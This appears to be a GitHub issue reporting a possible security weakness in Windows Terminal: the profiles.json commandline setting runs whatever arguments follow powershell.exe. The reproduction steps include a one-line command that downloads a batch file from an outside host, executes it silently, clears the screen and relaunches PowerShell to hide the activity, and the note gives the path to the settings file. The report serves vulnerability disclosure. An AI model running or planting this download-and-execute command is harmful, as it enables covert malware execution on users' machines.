# Environment
    Windows Edition: Windows 10 Education
    Version: 1903
    OS Build: 18362.10005
    Windows Terminal version: 0.3.2142.0
# Possible Bug: Description
In profiles.json, under profiles, powershell.exe is the default profile when
Terminal app fresh installed. Powershell is called by terminal app using:
"commandline" setting with parameter "powershell.exe".
We can add parameters after "powershell.exe" to automate tasks. This is happen
when each new tab with powershell is opened. But we can go futher to exploit
this feature.
The GIF demonstration shows one line command to download an (assumed) infected
executable from unknown domain, keep it in the public/downloads directory to
evade low privilege errors, run the infected executable, clear the screen
immediately and run powershell.exe again.
It's assumed that the executable will a malware that quickly starts and closes
itself. The user will find it hard to detect if anything is happenning because
a fresh powershell instance is called after the downloaded executable is run.
Also, there is no warning prompt while running the executable as shown in
demonstation.
###  ![demo
video](https://camo.githubusercontent.com/026156946bfdf7f1291790f40a70b2d99cf59e1c2315dff7a4654657e05f7645/68747470733a2f2f70726f6861636b2e746563682f64656d6f2e706e67)
# Steps to reproduce
  * Create a sample batch script for demo purpose with anything inside. Here I've created script to open multiple cmd windows
  * Upload the file to any shady website. Here I've used my own not-trusted website
  * Paste the following command after "powershell.exe" for the setting "commandline" under profiles in profiles.json
command:  
`wget -O 'C:\\Users\\Public\\Downloads\\VIR.bat' prohack.tech/VIR.bat ;
[Diagnostics.Process]::Start('C:\\Users\\Public\\Downloads\\VIR.bat') ; clear
; powershell.exe`
  * Run the terminal app.
# Expected behavior
Expected behavior is to not allow arguments directly from profiles.json
setting because another applications could potentially infect(?) the settings
file to download untrusted files.
# Actual behavior
Arguments are allowed to run from profiles.json setting.
# Note
Marked as possible security issue because exploiting this may be tricky, since
larger file download through wget can be seen as being downloaded by the user.
Also, first-hand running processes will show details in powershell instance.
But as shown in the demo, processes started from the downloaded executable do
not show in powershell. Could possibly be exploited without the user knowing.
Finding profiles.json is also easy with this string:
"%LOCALAPPDATA%\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\RoamingState".  
If this is a real issue, name it 'profile commandline injection' :P